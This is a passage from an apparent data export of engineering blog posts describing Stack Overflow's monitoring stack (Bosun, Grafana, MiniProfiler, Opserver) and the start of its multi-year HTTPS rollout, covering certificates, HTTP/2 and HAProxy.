log stream, parses a bit of info from each entry, and sends aggregate metrics to Bosun. This isn\u2019t open source at the moment because\u2026well I\u2019m not sure we\u2019ve ever mentioned it exists. If there\u2019s demand for such a thing, shout and we\u2019ll take a look. Bosun: Alerting A key feature of Bosun I really love is the ability to test an alert against history while designing it. This helps seeing when it would have triggered. It\u2019s an awesome sanity check. Let\u2019s be honest, monitoring isn\u2019t perfect, it was never perfect, and it won\u2019t ever be perfect. A lot of monitoring comes from lessons learned, because the things that go wrong often include things you never even considered going wrong\u2026and that means you didn\u2019t have monitoring and/or alerts on them from day 1. Alerts are often added after something goes wrong. Despite your best intentions and careful planning, you will miss things and alerts will be added after the first incident. That\u2019s okay. It\u2019s in the past. All you can do now is make things better in the hopes that it doesn\u2019t happen again. Whether you\u2019re designing ahead of time or in retrospect, this feature is awesome:   You can see on November 18th there was one system that got low enough to trigger a warning here, but otherwise all green. Sanity checking if an alert is noisy before anyone ever gets notified? I love it. And then we have critical errors that are so urgent they need to be addressed ASAP. For those cases, we post them to our internal chat rooms. These are things like errors creating a Stack Overflow Team (You\u2019re trying to give us money and we\u2019re erroring? Not. Cool.) or a scheduled task is failing. We also have metrics monitoring (via Bosun) errors in a few ways:  From our Exceptional error logs (summed up per application) From Fastly and HAProxy  If we\u2019re seeing a high error rate for any reason on either of these, messages with details land in chat a minute or two after. (Since they\u2019re aggregate count based, they can\u2019t be immediate.)  These messages with links let us quickly dig into the issue. Did the network blip? Is there a routing issue between us and Fastly (our proxy and CDN)? Did some bad code go out and it\u2019s erroring like crazy? Did someone trip on a power cable? Did some idiot plug both power feeds into the same failing UPS? All of these are extremely important and we want to dig into them ASAP. Another way alerts are relayed is email. Bosun has some nice functionality here that assists us. An email may be a simple alert. Let\u2019s say disk space is running low or CPU is high and a simple graph of that in the email tells a lot. \u2026and then we have more complex alerts. Let\u2019s say we\u2019re throwing over our allowed threshold of errors in the shared error store. Okay great, we\u2019ve been alerted! But\u2026which app was it? Was it a one-off spike? Ongoing? Here\u2019s where the ability to define queries for more data from SQL or Elasticsearch come in handy (remember all that logging?). We can add breakdowns and details to the email itself. You can be better informed to handle (or even decide to ignore) an email alert without digging further. Here\u2019s an example email from NY-TSDB03\u2019s CPU spiking a few days ago:    We also include the last 10 incidents for this alert on the systems in question so you can easily identify a pattern, see why they were dismissed, etc. They\u2019re just not in this particular email I was using as an example. Grafana Okay cool. Alerts are nice, but I just want to see some data\u2026 I got you fam! After all, what good is all that data if you can\u2019t see it? Presentation and accessibility matter. Being able to quickly consume the data is important. Graphical vizualizations for time series data are an excellent way of exploring. When it comes to monitoring, you have to either 1) be looking at the data, or 2) have rock solid 100% coverage with alerts so no one has to ever look at the data. And #2 isn\u2019t possible. When a problem is found, often you\u2019ll need to go back and see when it started. \u201cHOW HAVE WE NOT NOTICED THIS IN 2 WEEKS?!?\u201d isn\u2019t as uncommon as you\u2019d think. So, historical views help. This is where we use Grafana. It\u2019s an excellent open source tool, for which we provide a Bosun plugin so it can be a data source. (Technically you can use OpenTSDB directly, but this adds functionality.) Our use of Grafana is probably best explained in pictures, so a few examples are in order. Here\u2019s a status dashboard showing how Fastly is doing. Since we\u2019re behind them for DDoS protection and faster content delivery, their current status is also very much our current status.  This is just a random dashboard that I think is pretty cool. It\u2019s traffic broken down by country of origin. It\u2019s split into major continents and you can see how traffic rolls around the world as people are awake.  If you follow me on Twitter, you\u2019re likely aware we\u2019re having some garbage collection issues with .NET Core. Needing to keep an eye on this isn\u2019t new though. We\u2019ve had this dashboard for years:  Note: Don\u2019t go by any numbers above for scale of any sort, these screenshots were taken on a holiday weekend. Client Timings An important note about everything above is that it\u2019s server side. Did you think about it until now? If you did, awesome. A lot of people don\u2019t think that way until one day when it matters. But it\u2019s always important. It\u2019s critical to remember that how fast you render a webpage doesn\u2019t matter. Yes, I said that. It doesn\u2019t matter, not directly anyway. The only thing that matters is how fast users think your site is. How fast does it feel? This manifests in many ways on the client experience, from the initial painting of a page to when content blinks in (please don\u2019t blink or shift!), ads render, etc. Things that factor in here are, for example, how long did it take to\u2026  Connect over TCP?  (HTTP/3 isn\u2019t here yet) Negotiate the TLS connection? Finish sending the request? Get the first byte? Get the last byte? Initially paint the page? Issue requests for resources in the page? Render all the things? Finish attaching JavaScript handlers?  \u2026hmmm, good questions! These are the things that matter to the user experience. Our question pages render in 18ms. I think that\u2019s awesome. And I might even be biased. \u2026but it also doesn\u2019t mean crap to a user if it takes forever to get to them. So, what can we do? Years back, I threw together a client timings pipeline when the pieces we needed first became available in browsers. The concept is simple: use the navigation timings API available in web browsers and record it. That\u2019s it. There\u2019s some sanity checks in there (you wouldn\u2019t believe the number of NTP clock corrections that yield invalid timings from syncs during a render making clocks go backwards\u2026), but otherwise that\u2019s pretty much it. For 5% of requests to Stack Overflow (or any Q&A site on our network), we ask the browser to send these timings. We can adjust this percentage at will. For a description of how this works, you can visit teststackoverflow.com. Here\u2019s what it looks like:   This domain isn\u2019t exactly monitoring, but it kind of is. We use it to test things like when we switched to HTTPS what the impact for everyone would be with connection times around the world (that\u2019s why I originally created the timings pipeline). It was also used when we added DNS providers, something we now have several of after the Dyn DNS attack in 2016. How? Sometimes I sneakily embed it as an <iframe> on stackoverflow.com to throw a lot of traffic at it so we can test something. But don\u2019t tell anyone, it\u2019ll just be between you and me. Okay, so now we have some data. If we take that for 5% of traffic, send it to a server, plop it in a giant clustered columnstore in SQL and send some metrics to Bosun along the way, we have something useful. We can test before and after configs, looking at the data. We can also keep an eye on current traffic and look for problems. We use Grafana for the last part, and it looks like this:  Note: that\u2019s a 95% percentile view, the median total render time is the white dots towards the bottom (under 500ms most days). MiniProfiler Sometimes the data you want to capture is more specific and detailed than the scenarios above. In our case, we decided almost a decade ago that we wanted to see how long a webpage takes to render in the corner of every single page view. Equally important to monitoring anything is looking at it. Making it visible on every single page you look at is a good way of making that happen. And thus, MiniProfiler was born. It comes in a few flavors (the projects vary a bit): .NET, Ruby, Go, and Node.js. We\u2019re looking at the .NET version I maintain here:  The number is all you see by default, but you can expand it to see a breakdown of which things took how long, in tree form. The commands that are linked there are also viewable, so you can quickly see the SQL or Elastic query that ran, or the HTTP call made, or the Redis key fetched, etc. Here\u2019s what that looks like:  Note: If you\u2019re thinking, that\u2019s way longer than we say our question renders take on average (or even 99th percentile), yes, it is. That\u2019s because I\u2019m a moderator here and we load a lot more stuff for moderators. Since MiniProfiler has minimal overhead, we can run it on every request. To that end, we keep a sample of profiles per-MVC-route in Redis. For example, we keep the 100 slowest profiles of any route at a given time. This allows us to see what users may be hitting that we aren\u2019t. Or maybe anonymous users use a different query and it\u2019s slow\u2026we need to see that. We can see the routes being slow in Bosun, the hits in HAProxy logs, and the profile snapshots to dig in. All of this without seeing any code at all, that\u2019s a powerful overview combination. MiniProfiler is awesome (like I\u2019m not biased\u2026) but it is also part of a bigger set of tools here. Here\u2019s a view of what those snapshots and aggregate summaries looks like:    Snapshots Summary          \u2026we should probably put an example of that in the repo. I\u2019ll try and get around to it soon. MiniProfiler was started by Marc Gravell, Sam Saffron, and Jarrod Dixon. I am the primary maintainer since 4.x, but these gentleman are responsible for it existing. We put MiniProfiler in all of our applications. Note: see those GUIDs in the screenshots? That\u2019s MiniProfiler just generating an ID. We now use that as a \u201cRequest ID\u201d and it gets logged in those HAProxy logs and to any exceptions as well. Little things like this help tie the world together and let you correlate things easily. Opserver So, what is Opserver? It\u2019s a web-based dashboard and monitoring tool I started when SQL Server\u2019s built-in monitoring lied to us one day. About 5 years ago, we had an issue where SQL Server AlwaysOn Availability Groups showed green on the SSMS dashboard (powered by the primary), but the replicas hadn\u2019t seen new data for days. This was an example of extremely broken monitoring. What happened was the HADR thread pool exhausted and stopped updating a view that had a state of \u201call good\u201d. I\u2019d link you to the Connect item but they just deleted them all. I\u2019m not bitter. The design of such isn\u2019t necessarily flawed, but when caching/storing the state of a thing, it needs to have a timestamp. If it hasn\u2019t been updated in <pick a threshold>,  that\u2019s a red alert. Nothing about the state can be trusted. Anyway, enter Opserver. The first thing it did was monitor each SQL node rather than trusting the master. Since then, I\u2019ve added monitoring for our other systems we wanted in a quick web-based view. We can see all servers (based on Bosun, or Orion, or WMI directly). Here is an overview of where Opserver is today: Opserver: Primary Dashboard The landing dashboard is a server list showing an overview of what\u2019s up. Users can search by name, service tag, IP address, VM host, etc. You can also drill down to all-time history graphs for CPU, memory, and network on each node.  Within each node looks like this:  If using Bosun and running Dell servers, we\u2019ve added hardware metadata like this:  Opserver: SQL Server In the SQL dashboard, we can see server status and how the availability groups are doing. We can see how much activity each node has and which one is primary (in blue) at any given time. The bottom section is AlwaysOn Availability Groups, we can see who\u2019s primary for each, how far behind replication is, and how much queues are backed up. If things go south and a replica is unhealthy, some more indicators pop in like which databases are having issues and the free disk space on the primary for all drives involved in T-logs (since they will start growing if replication remains down):  There\u2019s also a top-level all-jobs view for quick monitoring and enabling/disabling:  And in the per-instance view we can see the stats about the server, caches, etc., that we\u2019ve found relevant over time.  For each instance, we also report top queries (based on plan cache, not query store yet), active-right now queries (based on sp_whoisactive), connections, and database info.    \u2026and if you want to drill down into a top query, it looks like this:  In the databases view, there are drill downs to see tables, indexes, views, stored procedures, storage usage, etc.      Opserver: Redis For Redis, we want to see the topology chain of primary and replicas as well as the overall status of each instance:   Note that you can kill client connections, get the active config, change server topologies, and analyze the data in each database (configurable via Regexes). The last one is a heavy KEYS and DEBUG OBJECT scan, so we run it on a replica node or are allowed to force running it on a master (for safety). Analysis looks like this:  Opserver: Elasticsearch For Elasticsearch, we usually want to see things in a cluster view since that\u2019s how it behaves. What isn\u2019t seen below is that when an index goes yellow or red. When that happens, new sections of the dashboard appear showing shards that are in trouble, what they\u2019re doing (initializing, relocating, etc.), and counts appear in each cluster summarizing how many are in which status.   Note: the PagerDuty tab up there pulls from the PagerDuty API and displays on-call information, who\u2019s primary, secondary, allows you to see and claim incidents, etc. Since it\u2019s almost 100% not data you\u2019d want to share, there\u2019s no screenshot here. :) It also has a configurable raw HTML section to give visitors instructions on what to do or who to reach out to. Opserver: Exceptions Exceptions in Opserver are based on StackExchange.Exceptional. In this case specifically, we\u2019re looking at the SQL Server storage provider for Exceptional. Opserver is a way for many applications to share a single database and table layout and have developers view their exceptions in one place.  The top level view here can just be applications (the default), or it can be configured in groups. In the above case, we\u2019re configuring application groups by team so a team can bookmark or quickly click on the exceptions they\u2019re responsible for. In the per-exception page, the detail looks like this:   There are also details recorded like request headers (with security filters so we don\u2019t log authentication cookies for example), query parameters, and any other custom data added to an exception. Note: you can configure multiple stores, for instance we have New York and Colorado above. These are separate databases allowing all applications to log to a very-local store and still get to them from a single dashboard. Opserver: HAProxy The HAProxy section is pretty straightforward\u2013we\u2019re simply presenting the current HAProxy status and allowing control of it. Here\u2019s what the main dashboard looks like:  For each background group, specific backend server, entire server, or entire tier, it also allows some control. We can take a backend server out of rotation, or an entire backend down, or a web server out of all backends if we need to shut it down for emergency maintenance, etc.  Opserver: FAQs I get the same questions about Opserver routinely, so let\u2019s knock a few of them out:  Opserver does not require a data store of any kind for itself (it\u2019s all config and in-memory state).      This may happen in the future to enhance functionality, but there are no plans to require anything.   Only the dashboard tab and per-node view is powered by Bosun, Orion, or WMI - all other screens like SQL, Elastic, Redis, etc. have no dependency\u2026Opserver monitors these directly. Authentication is both global and per-tab pluggable (who can view and who\u2019s an admin are separate), but built-in configuration is via groups and Active Directory is included.      On admin vs. viewer: A viewer gets a read-only view. For example, HAProxy controls wouldn\u2019t be shown.   All tabs are not required\u2013each is independent and only appears if configured.      For example, if you wanted to only use Opserver as an Elastic or Exceptions dashboard, go nuts.    Note: Opserver is currently being ported to ASP.NET Core as I have time at night. This should allow it to run without IIS and hopefully run on other platforms as well soon. Some things like AD auth to SQL Servers from Linux and such is still on the figure-it-out list. If you\u2019re looking to deploy Opserver, just be aware deployment and configuration will change drastically soon (it\u2019ll be simpler) and it may be better to wait. Where Do We Go Next? Monitoring is an ever-evolving thing. For just about everyone, I think. But I can only speak of plans I\u2019m involved in\u2026so what do we do next? Health Check Next Steps Health check improvements are something I\u2019ve had in mind for a while, but haven\u2019t found the time for. When you\u2019re monitoring things, the source of truth is a matter of concern. There\u2019s what a thing is and what a thing should be. Who defines the latter? I think we can improve things here on the dependency front and have it generally usable across the board (\u2026and I really hope someone\u2019s already doing similar, tell me if so!). What if we had a simple structure from the health checks like this: public class HealthResult {     public string AppName { get; set; }     public string ServerName { get; set; }     public HealthStatus Status { get; set; }     public List<string> Tags { get; set; }     public List<HealthResult> Dependencies { get; set; }     public Dictionary<string, string> Attributes { get; set; } } public enum HealthStatus {     Healthy,     Warning,     Critical,     Unknown }  This is just me thinking out loud here, but the key part is the Dependencies. What if you asked a web server \u201cHey buddy, how ya doing?\u201d and it returned not a simple JSON object, but a tree of them? But each level is all the same thing, so overall we\u2019d have a recursive list of dependencies. For example, a dependency list that included Redis\u2013if we couldn\u2019t reach 1 of 2 Redis nodes, we\u2019d have 2 dependencies in the list, a Healthy for one and a Critical or Unknown for the other in the dependency list and the web server would be Warning instead of Healthy. The main point here is: the monitoring system doesn\u2019t need to know about dependencies. The systems themselves define them and return them. This way we don\u2019t get into config skew where what\u2019s being monitored doesn\u2019t match what should be there. This can happen often in deployments with topology or dependency changes. This may be a terrible idea, but it\u2019s a general one I have for Opserver (or any script really) to get a health reading and the why of a health reading. If we lose another node, these n things break. Or, we see the common cause of n health warnings. By pointing at a few endpoints, we could get a tree view of everything. Need to add more data for your use case? Sure! It\u2019s JSON, so just inherit from the object and add more stuff as needed. It\u2019s an easily extensible model. I think. I need to take the time to build this\u2026maybe it\u2019s full of problems. Or maybe someone reading this will tell me it\u2019s already done (hey you!). Bosun Next Steps Bosun has largely been in maintenance mode due to a lack of resources and other priorities. We haven\u2019t done as much as we\u2019d like because we need to have the discussion on the best path forward. Have other tools caught up and filled the gaps that caused us to build it in the first place? Has SQL 2017 or 2019 already improved the queries we had issues with lowering the bar greatly? We need to take some time and look at the landscape and evaluate what we want to do. This is something we want to get into during Q1 2019. We know of some things we\u2019d like to do, such as improving the alert editing experience and some other UI areas. We just need to weigh some things and figure out where our time is best spent as with all things. Metrics Next Steps We are drastically under-utilizing metrics across our applications. We know this. The system was built for SREs and developers primarily, but showing developers all the benefits and how powerful metrics are (including how easy they are to add) is something we haven\u2019t done well. This is a topic we discussed at a company meetup last month. They\u2019re so, so cheap to add and we could do a lot better. Views differ here, but I think it\u2019s mostly a training and awareness issue we\u2019ll strive to improve. The health checks above\u2026maybe we easily allow integrating metrics from BosunReporter there as well (probably only when asked for) to make one decently powerful API to check the health and status of a service. This would allow a pull model for the same metrics we normally push. It needs to be as cheap as possible and allocate little, though. Tools Summary I mentioned several tools we\u2019ve built and open sourced above. Here\u2019s a handy list for reference:  Bosun: Go-based monitoring and alerting system \u2013 primary developed by Kyle Brandt, Craig Peterson, and Matt Jibson. Bosun: Grafana Plugin: A data source plugin for Grafana \u2013 developed by Kyle Brandt. BosunReporter: .NET metrics collector/sender for Bosun \u2013 developed by Bret Copeland. httpUnit: Go-based HTTP monitor for testing compliance of web endpoints \u2013 developed by Matt Jibson and Tom Limoncelli. MiniProfiler: .NET-based (with other languages available like Node and Ruby) lightweight profiler for seeing page render times in real-time \u2013 created by Marc Gravell, Sam Saffron, and Jarrod Dixon and maintained by Nick Craver. Opserver: ASP.NET-based monitoring dashboard for Bosun, SQL, Elasticsearch, Redis, Exceptions, and HAProxy \u2013 developed by Nick Craver. StackExchange.Exceptional: .NET exception logger to SQL, MySQL, Postgres, etc. \u2013 developed by Nick Craver.  \u2026and all of these tools have additional contributions from our developer and SRE teams as well as the community at large. What\u2019s next? The way this series works is I blog in order of what the community wants to know about most. Going by the Trello board, it looks like Caching is the next most interesting topic. So next time expect to learn how we cache data both on the web tier and Redis, how we handle cache invalidation, and take advantage of pub/sub for various tasks along the way.", "content": "", "cover_photo_url": "https://nickcraver.com/blog/content/SO-Monitoring/SO-Monitoring-Opserver-Redis-Instance.png", "profile": 2, "updated_on": "2018-11-29T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 9098.5587411, "slug": "stack-overflow-how-we-do-monitoring-2018-edition-144", "topics": [61]}}, {"model": "app.post", "pk": 145, "fields": {"title": "HTTPS on Stack Overflow: The End of a Long Road", "link": "https://nickcraver.com/blog/2017/05/22/https-on-stack-overflow/", "source": 1, "normalized_link": "nickcraver.com/blog/2017/05/22/https-on-stack-overflow", "summary": "Today, we deployed HTTPS by default on Stack Overflow.  All traffic is now redirected to https:// and Google links will change over the next few weeks.  The activation of this is quite literally flipping a switch (feature flag), but getting to that point has taken years of work. As of now, HTTPS is the default on all Q&A websites. We\u2019ve been rolling it out across the Stack Exchange network for the past 2 months.  Stack Overflow is the last site, and by far the largest.  This is a huge milestone for us, but by no means the end.  There\u2019s still more work to do, which we\u2019ll get to. But the end is finally in sight, hooray! Fair warning: This is the story of a long journey. Very long.  As indicated by your scroll bar being very tiny right now.  While Stack Exchange/Overflow is not unique in the problems we faced along the way, the combination of problems is fairly rare. I hope you find some details of our trials, tribulations, mistakes, victories, and even some open source projects that resulted along the way to be helpful. It\u2019s hard to structure such an intricate dependency chain into a chronological post, so I\u2019ll break this up by topic: infrastructure, application code, mistakes, etc.  I think it\u2019s first helpful to preface with a list of problems that makes our situation somewhat unique:  We have hundreds of domains (many sites and other services)      Many second-level domains (stackoverflow.com, stackexchange.com, askubuntu.com, etc.) Many 4th level domains (e.g. meta.gaming.stackexchange.com)   We allow user submitted & embedded content (e.g. images and YouTube videos in posts) We serve from a single data center (latency to a single origin) We have ads (and ad networks) We use websockets, north of 500,000 active at any given (connection counts) We get DDoSed (proxy) We have many sites & apps communicating via HTTP APIs (proxy issues) We\u2019re obsessed with performance (maybe a little too much)  Since this post is a bit crazy, links for your convenience:  The Beginning Quick Specs Infrastructure      Certificates  Child Metas (meta.*.stackexchange.com)   Performance: HTTP/2 HAProxy: Serving up HTTPS CDN/Proxy: Countering Latency with Cloudflare & Fastly  Preparing for a Proxy: Client Timings CloudFlare  Railgun   Fastly   Global DNS Testing   Applications/Code      Preparing the Applications Global Login Local HTTPS Development Mixed Content          From You From Us   Redirects (301s) Websockets   Unknowns Mistakes  Protocol-Relative URLs APIs and .internal 301 Caching Help Center SNAFU   Open Source Next Steps  HSTS Preloading Chat Today    The Beginning We began thinking about deploying HTTPS on Stack Overflow back in 2013.  So the obvious question: It\u2019s 2017. What the hell took 4 years? The same 2 reasons that delay almost any IT project: dependencies and priorities.  Let\u2019s be honest, the information on Stack Overflow isn\u2019t as valuable (to secure) as most other data.  We\u2019re not a bank, we\u2019re not a hospital, we don\u2019t handle credit card payments, and we even publish most of our database both by HTTP and via torrent once a quarter.  That means from a security standpoint, it\u2019s just not as high of a priority as it is in other situations.  We also had far more dependencies than most, a rather unique combination of some huge problem areas when deploying HTTPS. As you\u2019ll see later, some of the domain problems are also permanent. The biggest areas that caused us problems were:  User content (users can upload images or specify URLs) Ad networks (contracts and support) Hosting from a single data center (latency) Hundreds of domains, at multiple levels (certificates)  Okay, so why do we want HTTPS on our websites?  Well, the data isn\u2019t the only thing that needs security.  We have moderators, developers, and employees with various levels of access via the web.  We want to secure their communications with the site. We want to secure every user\u2019s browsing history. Some people live in fear every day knowing that someone may find out they secretly like monads. Google also gives a boost to HTTPS websites in ranking (though we have no clue how much). Oh, and performance. We love performance. I love performance. You love performance. My dog loves performance. Let\u2019s have a performance hug. That was nice. Thank you. You smell nice. Quick Specs Some people just want the specs, so quick Q&A here (we love Q&A!):  Q: Which protocols do you support?      A: TLS 1.0, 1.1, 1.2 (Note: Fastly has a TLS 1.0 and 1.1 deprecation plan). TLS 1.3 support is coming   Q: Do you support SSL v2, v3?      A: No, these are broken, insecure protocols. Everyone should disable them ASAP.   Q: Which ciphers do you support?      A: At the CDN, we use Fastly\u2019s default suite A: At our load balancer, we use Mozilla\u2019s Modern compatibility suite   Q: Does Fastly connect to the origin over HTTPS?      A: Yes, if the CDN request is HTTPS, the origin request is HTTPS.   Q: Do you support forward secrecy?      A: Yes   Q: Do you support HSTS?      A: Yes, we\u2019re ramping it up across Q&A sites now. Once done we\u2019ll move it to the edge.   Q: Do you support HPKP?      A: No, and we likely won\u2019t.   Q: Do you support SNI?      A: No, we have a combined wildcard certificate for HTTP/2 performance reasons (details below).   Q: Where do you get certificates?      A: We use DigiCert, they\u2019ve been awesome.   Q: Do you support IE 6?      A: This move finally kills it, completely. IE 6 does not support TLS (default - though 1.0 can be enabled), we do not support SSL. With 301 redirects in place, most IE6 users can no longer access Stack Overflow. When TLS 1.0 is removed, none can.   Q: What load balancer do you use?      A: HAProxy (it uses OpenSSL internally).   Q: What\u2019s the motivation for HTTPS?      A: People kept attacking our admin routes like stackoverflow.com/admin.php.    Certificates Let\u2019s talk about certificates, because there\u2019s a lot of misinformation out there.  I\u2019ve lost count of the number of people who say you just install a certificate and you\u2019re ready to go on HTTPS. Take another look at the tiny size of your scroll bar and take a wild guess if I agree. We prefer the SWAG method for our guessing. The most common question we get: \u201cWhy not use Let\u2019s Encrypt?\u201d Answer: because they don\u2019t work for us.  Let\u2019s Encrypt is doing a great thing.  I hope they keep at it.  If you\u2019re on a single domain or only a few domains, they\u2019re a pretty good option for a wide variety of scenarios. We are simply not in that position. Stack Exchange has hundreds of domains. Let\u2019s Encrypt doesn\u2019t offer wildcards. These two things are at odds with each other. We\u2019d have to get a certificate (or two) every time we deployed a new Q&A site (or any other service). That greatly complicates deployment, and either a) drops non-SNI clients (around 2% of traffic these days) or b) requires far more IP space than we have. Another reason we want to control the certificate is we need to install the exact same certificates on both our local load balancers and our CDN/proxy provider. Unless we can do that, we can\u2019t failover (away from a proxy) cleanly in all cases. Anyone that has the certificate pinned via HPKP (HTTP Public Key Pinning) would fail validation. We\u2019re evaluating whether we\u2019ll deploy HPKP, but we\u2019ve prepped as if we will later. I\u2019ve gotten a lot of raised eyebrows at our main certificate having all of our primary domains + wildcards. Here\u2019s what that looks like:  Why do this?  Well, to be fair, DigiCert is the one who does this for us upon request. Why go through the pain of a manual certificate merge for every change? First, because we wanted to support as many people as possible. That includes clients that don\u2019t support SNI (for example, Android 2.3 was a big thing when we started). But also because of HTTP/2 and reality. We\u2019ll cover that in a minute. Certificates: Child Metas (meta.*.stackexchange.com) One of the tenets of the Stack Exchange network is having a place to talk about each Q&A site. We call it the \u201csecond place\u201d. As an example, meta.gaming.stackexchange.com exists to talk about gaming.stackexchange.com. So why does that matter? Well, it doesn\u2019t really. We only care about the domain here. It\u2019s 4 levels deep. I\u2019ve covered this before, but where did we end up? First the problem: *.stackexchange.com does cover gaming.stackexchange.com (and hundreds of other sites), but it does not cover meta.gaming.stackexchange.com. RFC 6125 (Section 6.4.3) states that:  The client SHOULD NOT attempt to match a presented identifier in which the wildcard character comprises a label other than the left-most label (e.g., do not match bar.*.example.net)  That means we cannot have a wildcard of meta.*.stackexchange.com. Well, shit. So what do we do?  Option 1: Deploying SAN certificates  We\u2019d need 3 (the limit is ~100 domains per), we\u2019d need to dedicate 3 IPs, and we\u2019d complicate new site launches (until the scheme changed, which it already has) We\u2019d have to pay for 3 custom certs for all time at the CDN/proxy We\u2019d have to have a DNS entry for every child meta under the meta.* scheme          Due to the rules of DNS, we\u2019d actually have to add a DNS entry for every single site, complicating site launches and maintenance.     Option 2: Move all domains to *.meta.stackexchange.com?      We\u2019d have a painful move, but it\u2019s 1-time and simplifies all maintenance and certificates We\u2019d have to build a global login system  (details here) This solution also creates a includeSubDomains HSTS preloading problem (details here)   Option 3: We\u2019ve had a good run, shut \u2018er down      This one is the easiest, but was not approved    We built a global login system and later moved the child meta domains (with 301s), and they\u2019re now at their new homes. For example, https://gaming.meta.stackexchange.com.  After doing this, we realized how much of a problem the HSTS preload list was going to be simply because those domains ever existed. I\u2019ll cover that near the end, as it\u2019s still in progress. Note that the problems here are mirrored on our journey for things like meta.pt.stackoverflow.com, but were more limited in scale since only 4 non-English versions of Stack Overflow exist. Oh, and this created another problem in itself.  By moving cookies to the top-level domain and relying on the subdomain inheritance of them, we now had to move domains. As an example, we use SendGrid to send email in our new system (rolling out now). The reason that it sends from stackoverflow.email with links pointed at sg-links.stackoverflow.email (a CNAME pointed to them), is so that your browser doesn\u2019t send any sensitive cookies. If it was sg-links.stackoverflow.com (or anything beneath stackoverflow.com), your browser would send our cookies to them. This is a concrete example of new things, but there were also miscellaneous not-hosted-by-us services under our DNS. Each one of these subdomains had to be moved or retired to get out from under our authenticated domains\u2026or else we\u2019d be sending your cookies to not-our-servers. It\u2019d be a shame to do all this work just to be leaking cookies to other servers at the end of it. We tried to work around this in one instance by proxying one of our Hubspot properties for a while, stripping the cookies on the way through. But unfortunately, Hubspot uses Akamai which started treating our HAProxy instance as a bot and blocking it in oh so fun various ways on a weekly basis. It was fun, the first 3 times. So anyway, that really didn\u2019t work out. It went so badly we\u2019ll never do it again. Were you curious why we have the Stack Overflow Blog at https://stackoverflow.blog/? Yep, security. It\u2019s hosted on an external service so that the marketing team and others can iterate faster. To facilitate this, we needed it off the cookied domains. The above issues with meta subdomains also introduced related problems with HSTS, preloading, and the includeSubDomains directive.  But we\u2019ll see why that\u2019s become a moot point later. Performance: HTTP/2 The conventional wisdom long ago was that HTTPS was slower. And it was. But times change. We\u2019re not talking about HTTPS anymore. We\u2019re talking about HTTPS with HTTP/2. While HTTP/2 doesn\u2019t require encryption, effectively it does.  This is because the major browsers require a secure connection to enable most of its features. You can argue specs and rules all day long, but browsers are the reality we all live in. I wish they would have just called it HTTPS/2 and saved everyone a lot of time. Dear browser makers, it\u2019s not too late.  Please, listen to reason, you\u2019re our only hope! HTTP/2 has a lot of performance benefits, especially with pushing resources opportunistically to the user ahead of asking for them. I won\u2019t write in detail about those benefits, Ilya Grigorik has done a fantastic job of that already.  As a quick overview, the largest optimizations (for us) include:  Request/Response Multiplexing Server Push Header Compression Stream Prioritization Fewer Origin Connections  Hey wait a minute, what about that silly certificate? A lesser-known feature of HTTP/2 is that you can push content not on the same domain, as long as certain criteria are met:  The origins resolve to the same server IP address. The origins are covered by the same TLS certificate (bingo!)  So, let\u2019s take a peek at our current DNS: \u03bb dig stackoverflow.com +noall +answer ; <<>> DiG 9.10.2-P3 <<>> stackoverflow.com +noall +answer ;; global options: +cmd stackoverflow.com.      201     IN      A       151.101.1.69 stackoverflow.com.      201     IN      A       151.101.65.69 stackoverflow.com.      201     IN      A       151.101.129.69 stackoverflow.com.      201     IN      A       151.101.193.69  \u03bb dig cdn.sstatic.net +noall +answer ; <<>> DiG 9.10.2-P3 <<>> cdn.sstatic.net +noall +answer ;; global options: +cmd cdn.sstatic.net.        724     IN      A       151.101.193.69 cdn.sstatic.net.        724     IN      A       151.101.1.69 cdn.sstatic.net.        724     IN      A       151.101.65.69 cdn.sstatic.net.        724     IN      A       151.101.129.69  Heyyyyyy, those IPs match, and they have the same certificate! This means that we can get all the wins of HTTP/2 server pushes without harming HTTP/1.1 users.  HTTP/2 gets push and HTTP/1.1 gets domain sharding (via sstatic.net). We haven\u2019t deployed server push quite yet, but all of this is in preparation. So in regards to performance, HTTPS is only a means to an end.  And I\u2019m okay with that.  I\u2019m okay saying that our primary drive is performance, and security for the site is not. We want security, but security alone in our situation is not enough justification for the time investment needed to deploy HTTPS across our network. When you combine all the factors above though, we can justify the immense amount of time and effort required to get this done. In 2013, HTTP/2 wasn\u2019t a big thing, but that changed as support increased and ultimately helped as a driver for us to invest time in HTTPS. It\u2019s also worth noting that the HTTP/2 landscape changed quite a bit during our deployment. The web moved from SPDY to HTTP/2 and NPN to ALPN.  I won\u2019t cover all that because we didn\u2019t do anything there. We watched, and benefited, but the giants of the web were driving all of that. If you\u2019re curious though, Cloudflare has a good write up of these moves. HAProxy: Serving up HTTPS We deployed initial HTTPS support in HAProxy back in 2013. Why HAProxy? Because we\u2019re already using it and they added support back in 2013 (released as GA in 2014) with version 1.5. We had, for a time, nginx in front of HAProxy (as you can see in the last blog post). But simpler is often better, and eliminating a lot of conntrack, deployment, and general complexity issues is usually a good idea. I won\u2019t cover a lot of detail here because there\u2019s simply not much to cover. HAProxy supports HTTPS natively via OpenSSL since 1.5 and the configuration is straightforward. Our configuration highlights are:  Run on 4 processes      1 is dedicated to HTTP/front-end handling 2-4 are dedicated to HTTPS negotiation   HTTPS front-ends are connected to HTTP backends via an abstract named socket. This reduces overhead tremendously. Each front-end or \u201ctier\u201d (we have 4: Primary, Secondary, Websockets, and dev) has corresponding :443 listeners. We append request headers (and strip ones you\u2019d send - nice try) when forwarding to the web tier to indicate how a connection came in. We use the Modern compatibility cipher suite recommended by Mozilla. Note: this is not the same suite our CDN runs.  HAProxy was the relatively simple and first step of supporting a :443 endpoint with valid SSL certificates. In retrospect, it was only a tiny spec of the effort needed. Here\u2019s a logical layout of what I described above\u2026and we\u2019ll cover that little cloud in front next:  CDN/Proxy: Countering Latency with Cloudflare & Fastly One of the things I\u2019m most proud of at Stack Overflow is the efficiency of our stack. That\u2019s awesome, right? Running a major website on a small set of servers from one data center? Nope. Not so much. Not this time. While it\u2019s awesome to be efficient for some things, when it comes to latency it suddenly becomes a problem. We\u2019ve never needed a lot of servers.  We\u2019ve never needed to expand to multiple locations (but yes, we have another for DR). This time, that\u2019s a problem. We can\u2019t (yet!) solve fundamental problems with latency, due to the speed of light. We\u2019re told someone else is working on this, but there was a minor setback with tears in the fabric of space-time and losing the gerbils. When it comes to latency, let\u2019s look at the numbers. It\u2019s almost exactly 40,000km around the equator (worst case for speed of light round-trip). The speed of light is 299,792,458 meters/second in a vacuum. Unfortunately, a lot of people use this number, but most fiber isn\u2019t in a vacuum. Realistically, most optical fiber is 30-31% slower. So we\u2019re looking at (40,075,000 m) / 